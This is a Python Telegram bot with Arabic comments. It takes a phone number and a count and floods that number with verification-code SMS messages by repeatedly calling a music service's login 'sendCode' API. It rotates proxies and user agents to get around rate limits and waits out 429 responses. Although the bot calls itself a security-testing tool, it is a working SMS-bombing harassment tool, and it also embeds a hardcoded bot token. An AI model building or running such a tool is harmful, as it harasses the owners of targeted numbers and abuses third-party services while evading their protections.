import telebot
import requests
import json
import random
import time
from telebot import types

# ------------------- الإعدادات -------------------
API_TOKEN = '7725928700:AAFN07OWx1xPNhvqRwaBskGz-9CvP6YV6W0'
bot = telebot.TeleBot(API_TOKEN)

# تخزين بيانات المستخدمين مؤقتاً
user_data = {}

# قوائم البروكسي و User-Agents (مأخوذة من الكود الخاص بك)
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"
]

proxies_list = [
    {'http': 'http://3.71.96.137:8090'},
    {'http': 'http://49.13.173.87:8081'},
    {'http': 'http://49.12.235.70:8081'},
    {'http': 'http://116.202.121.34:3128'},
    {'http': 'http://20.210.113.32:8123'}
]

# ------------------- دوال البوت -------------------

@bot.message_handler(commands=['start'])
def send_welcome(message):
    """الترحيب وبدء العملية"""
    welcome_text = (
        "👋 *أهلاً بك يا محمود في بوت الاختبار الأمني*\n\n"
        "🛠 هذا البوت مخصص لاختبار الضغط والتوعية.\n"
        "📥 *أرسل رقم الهاتف الآن* (بدون كود الدولة 20)."
    )
    bot.reply_to(message, welcome_text, parse_mode='Markdown')
    # الانتقال لخطوة استلام الرقم
    bot.register_next_step_handler(message, get_number)

def get_number(message):
    """التحقق من الرقم وطلبه"""
    chat_id = message.chat.id
    number = message.text.strip()

    # تحقق بسيط من صحة الأرقام
    if not number.isdigit() or len(number) < 10:
        bot.reply_to(message, "❌ *رقم غير صحيح!* يرجى إرسال أرقام فقط.\nأعد المحاولة /start", parse_mode='Markdown')
        return

    # حفظ الرقم في الذاكرة المؤقتة
    user_data[chat_id] = {'number': number}
    
    msg = bot.send_message(chat_id, "✅ تم حفظ الرقم.\n🔢 *كم عدد الرسائل التي تريد إرسالها؟*", parse_mode='Markdown')
    bot.register_next_step_handler(msg, start_process)

def start_process(message):
    """بدء العملية وتحديث الرسالة"""
    chat_id = message.chat.id
    try:
        count = int(message.text.strip())
        number = user_data[chat_id]['number']
    except (ValueError, KeyError):
        bot.send_message(chat_id, "❌ حدث خطأ في المدخلات. ابدأ من جديد /start")
        return

    # إرسال رسالة الحالة الأولية
    status_msg = bot.send_message(
        chat_id, 
        f"🚀 *بدأ التشغيل...*\n"
        f"📱 الرقم: `{number}`\n"
        f"📨 المطلوب: {count}\n"
        f"ـــــــــــــــــــــــــــــــ\n"
        f"⏳ جاري الاتصال بالسيرفر...", 
        parse_mode='Markdown'
    )

    # متغيرات التتبع
    success = 0
    fail = 0
    url = "https://api.twistmena.com/music/Dlogin/sendCode"
    payload = json.dumps({"dial": f"2{number}"})

    # حلقة التكرار
    for i in range(count):
        proxy = random.choice(proxies_list)
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': "application/json",
            'Content-Type': "application/json",
            'platform': "android",
            'accept-language': "ar",
        }

        try:
            # إرسال الطلب
            response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=8)
            
            if response.status_code == 200 and "responseHeader" in response.json():
                success += 1
            elif response.status_code == 429:
                # في حالة الحظر المؤقت
                fail += 1
                time.sleep(20) # انتظار لفك الحظر
            else:
                fail += 1
        except Exception:
            # مشاكل اتصال أو بروكسي
            fail += 1

        # تحديث الرسالة كل 3 محاولات أو في المحاولة الأخيرة
        # (لتقليل استهلاك موارد التلجرام وتجنب الحظر)
        if (i + 1) % 3 == 0 or (i + 1) == count:
            try:
                new_text = (
                    f"🚀 *حالة التشغيل المباشرة*\n"
                    f"📱 الهدف: `{number}`\n"
                    f"🔢 التقدم: {i + 1} / {count}\n"
                    f"ـــــــــــــــــــــــــــــــ\n"
                    f"✅ نجاح: {success}\n"
                    f"🔴 فشل: {fail}"
                )
                
                # تعديل الرسالة فقط إذا تغير النص
                if new_text != status_msg.text:
                    bot.edit_message_text(
                        chat_id=chat_id, 
                        message_id=status_msg.message_id, 
                        text=new_text, 
                        parse_mode='Markdown'
                    )
            except Exception:
                pass # تجاهل أخطاء التعديل البسيطة
        
        # تأخير عشوائي بين الرسائل
        time.sleep(random.uniform(2, 5))

    # التقرير النهائي بعد انتهاء الحلقة
    final_text = (
        f"🏁 *تم الانتهاء بنجاح*\n"
        f"📱 الرقم: `{number}`\n"
        f"ـــــــــــــــــــــــــــــــ\n"
        f"✅ إجمالي الناجح: {success}\n"
        f"🔴 إجمالي الفشل: {fail}\n\n"
        f"اضغط /start لبدء عملية جديدة."
    )
    bot.edit_message_text(
        chat_id=chat_id, 
        message_id=status_msg.message_id, 
        text=final_text, 
        parse_mode='Markdown'
    )

# ------------------- تشغيل البوت -------------------
if __name__ == "__main__":
    print("--- Bot Started by Mahmoud AboElfadl ---")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Error: {e}")